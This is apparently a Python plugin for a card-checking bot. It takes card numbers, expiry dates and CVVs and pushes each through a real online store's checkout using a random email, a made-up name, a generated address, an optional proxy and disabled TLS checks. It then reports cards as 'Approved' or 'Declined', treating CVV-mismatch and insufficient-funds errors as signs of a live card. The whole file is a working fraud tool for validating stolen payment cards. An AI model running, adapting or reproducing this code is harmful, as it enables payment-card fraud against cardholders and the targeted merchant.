import random
import string
import asyncio
import httpx
from plugins.tools.address import fakexy

def random_email():
    random_letters = "".join(random.choices(string.ascii_lowercase, k=10))
    return f"{random_letters}@gmail.com"

def capture(string, start, end):
    start_pos, end_pos = string.find(start), string.find(
        end, string.find(start) + len(start)
    )
    return (
        string[start_pos + len(start) : end_pos]
        if start_pos != -1 and end_pos != -1
        else None
    )

async def payflow(cc, mes, ano, cvv, proxy: str = None):
    if len(ano) == 2:
        ano = "20" + ano
    if mes.startswith("0") and len(mes) == 2:
        mes = mes[1]
    email = random_email()
    type_cc = "VI"
    if cc[0] == "5":
        type_cc = "MC"
    if cc[0] == "3":
        type_cc = "AE"
    if cc[0] == "6":
        type_cc = "DI"

    async with httpx.AsyncClient(follow_redirects=True, verify=False, proxies=proxy, timeout=None) as client:
        address_info = fakexy('us')
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "Accept-Language": "es-419,es;q=0.6",
            "Connection": "keep-alive",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        }

        response = await client.get(
            "https://www.eaglemat.com/diamond-plate-runner-mat.html",
            headers=headers,
        )
        response_text = response.text

        url = capture(response_text, '<form action="', '"')
        form_key = capture(
            response_text, '<input name="form_key" type="hidden" value="', '"'
        )
        product = capture(
            response_text, '<input type="hidden" name="product" value="', '"'
        )

        data = {
            "form_key": form_key,
            "product": "2169",
            "related_product": "",
            "super_attribute[80]": "95",
            "super_attribute[122]": "266",
            "mico-bannerprintpricing-select": "2xY",
            "mico-bannerprintpricing-y": "1",
            "mico-bannerprintpricing-y-in": "0",
            "options[2598]": "2 ft.",
            "options[2597]": "1 ft.",
            "qty": "1",
            "cpid": product,
        }

        response = await client.post(url, headers=headers, data=data)

        data = {
            "billing[firstname]": "Alex",
            "billing[lastname]": "Varela",
            "billing[email]": email,
            "billing[company]": "",
            "billing[street][]": [
                address_info['address'],
                "",
            ],
            "billing[region_id]": "43",
            "billing[region]": "",
            "billing[city]": address_info['city'],
            "billing[country_id]": "US",
            "billing[postcode]": address_info['zip_code'],
            "billing[telephone]": "9513573888",
            "billing[fax]": "",
            "billing[customer_password]": "",
            "billing[confirm_password]": "",
            "billing[use_for_shipping]": "1",
            "shipping[firstname]": "",
            "shipping[lastname]": "",
            "shipping[company]": "",
            "shipping[street][]": [
                "",
                "",
            ],
            "shipping[region_id]": "43",
            "shipping[region]": "",
            "shipping[city]": "",
            "shipping[country_id]": "US",
            "shipping[postcode]": address_info['zip_code'],
            "shipping[telephone]": address_info['phone_number'],
            "shipping[fax]": "",
            "shipping_method": "productmatrix_Standard",
            "payment[method]": "verisign",
            "payment[cc_type]": type_cc,
            "payment[cc_number]": cc,
            "payment[cc_exp_month]": mes,
            "payment[cc_exp_year]": ano,
            "payment[cc_cid]": cvv,
            "remove": "0",
            "coupon_code": "",
            "subscribe": "1",
        }

        response = await client.post(
            "https://www.eaglemat.com/gomage_checkout/onepage/save/",
            headers=headers,
            data=data,
        )
        response = await client.get(
            "https://www.eaglemat.com/checkout/onepage/", headers=headers
        )

    if "onepage/success" in response.text:
        status = "Approved ✅"
        mensaje = "Charged 26$ ✅"
    else:
        mensaje = capture(
            response.text,
            '<ul class="messages"><li class="error-msg"><ul><li><span>',
            "</span>",
        )
        if "CVV2 Mismatch" in mensaje:
            status = "Approved ✅"
        elif "Funds" in mensaje:
            status = "Approved ✅"
        else:
            status = "Declined ❌"
    return status, mensaje
